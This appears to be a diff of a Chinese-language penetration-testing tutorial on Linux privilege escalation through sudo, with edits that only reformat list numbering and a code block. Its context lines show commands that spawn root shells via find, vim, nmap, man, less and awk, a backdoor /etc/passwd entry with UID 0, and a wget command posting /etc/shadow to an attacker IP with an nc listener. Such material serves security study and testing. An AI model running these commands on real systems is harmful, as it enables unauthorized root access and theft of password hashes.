@@ -74,7 +74,7 @@ sudo -l
 
 以下針對使用sudo達成權限提升的細節進行說明
 
-* 1. **使用Find指令**
+* 1.**使用Find指令**
 ```
 sudo find /etc/passwd -exec /bin/sh \;
 ```
@@ -82,11 +82,11 @@ sudo find /etc/passwd -exec /bin/sh \;
 ```
 sudo find /bin -name nano -exec /bin/sh \;
 ```
-* 2. **使用Vim指令**
+* 2.**使用Vim指令**
 ```
 sudo vim -c '!sh'
 ```
-* 3. **使用Nmap指令**
+* 3.**使用Nmap指令**
 
 舊方法
 ```
@@ -101,13 +101,13 @@ sh-4.1#
 ```
 echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
 ```
-* 4. **使用Man指令**
+* 4.**使用Man指令**
 ```
 sudo man man
 ```
 然後輸入!sh及按下Enter
 
-* 5. **使用Less/More指令**
+* 5.**使用Less/More指令**
 
 ```
 sudo less /etc/hosts
@@ -115,11 +115,11 @@ sudo less /etc/hosts
 sudo more /etc/hosts
 ```
 然後輸入!sh及按下Enter
-* 6. **使用awk指令**
+* 6.**使用awk指令**
 ```
  sudo awk 'BEGIN {system("/bin/sh")}'
 ```
-* 7. **使用nano指令**
+* 7.**使用nano指令**
 
 nano是文字編輯器，可以用來修改passwd文件，並在需要切換用戶之後以root權限加入password文件中的使用者。在/etc/passwd中增加此行可將此用戶添加root權限
 ```java
@@ -133,14 +133,17 @@ sudo nano  /etc/passwd
 ```
 su touhid
 ```
-* 8. **使用wget指令**
+* 8.**使用wget指令**
 
 這種非常酷的方式需要Web服務器下載文件。 這種方式我從未在任何地方看到過。 
 
 **攻擊者端**
 1. 將受害端/etc/passwd文件複製到攻擊者端中
 2. 修改文件並將passwd文件增加以下資訊，並保存
-     touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash  
+
+```
+touhid:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:root:/root:/bin/bash 
+``` 
 3. 將passwd托管至Web伺服器主機
 
 **受害端**
@@ -160,7 +163,7 @@ sudo wget --post-file=/etc/shadow 192.168.56.1:8080
 啟用listener於攻擊者端: nc -lvp 8080
 
 
-* 9. **使用apache指令**
+* 9.**使用apache指令**
 
 無法獲得shell與無法編輯系統檔案，但能夠檢視系統檔案
 ```
